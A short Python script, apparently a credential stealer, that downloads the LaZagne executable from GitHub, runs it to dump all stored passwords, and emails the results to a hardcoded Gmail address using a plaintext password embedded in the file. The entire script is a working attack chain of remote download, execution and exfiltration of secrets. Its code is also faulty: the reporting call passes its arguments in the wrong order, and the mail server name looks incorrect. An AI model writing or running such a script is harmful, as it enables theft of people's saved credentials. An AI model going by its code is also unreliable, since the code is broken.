#!/usr/bin/env python
import subprocess, smtplib, requests, os

# Download function from get request
def download(url):
    down_file = requests.get(url)
    print(down_file)
    filename = url.split("/")
    #binary mode open
    with open(filename.pop(), "wb") as out_file:
        out_file.write(down_file.content)

def execute_command(command):
    return subprocess.check_output(command, shell=True)

def send_mail(email, password, message):
    # Creating SMTP server instance with google server
    smtp_server = smtplib.SMTP("smtp.google.com","587")
    smtp_server.login(email,password)
    smtp_server.sendmail(email, email, message)
    smtp_server.quit()

def reportback(content, mail, password):
    send_mail(mail, password, content)


download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
command_output = execute_command("laZagne.exe all")
reportback("joehatbennet@gmail.com", "jCi5BDRiGAjj5jH", command_output)
